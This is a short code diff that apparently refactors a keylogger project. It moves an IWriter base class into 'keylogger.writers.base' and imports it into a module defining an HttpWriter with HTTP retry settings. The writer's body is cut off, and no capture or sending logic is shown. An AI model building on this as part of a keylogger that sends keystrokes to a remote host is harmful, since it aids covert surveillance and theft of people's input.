@@ -1,19 +1,16 @@
-from __future__ import annotations
-
-from abc import ABC
 from typing import Any, Dict
 import requests
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
+
+from keylogger.writers.base import IWriter
+
 
 
 RETRIES: int = 3
 BACKOFF_FACTOR: float = 0.3
 
 
-class IWriter(ABC):
-    def __init__(self, destination: str):
-        self._destination = destination
 
 
 class HttpWriter(IWriter):
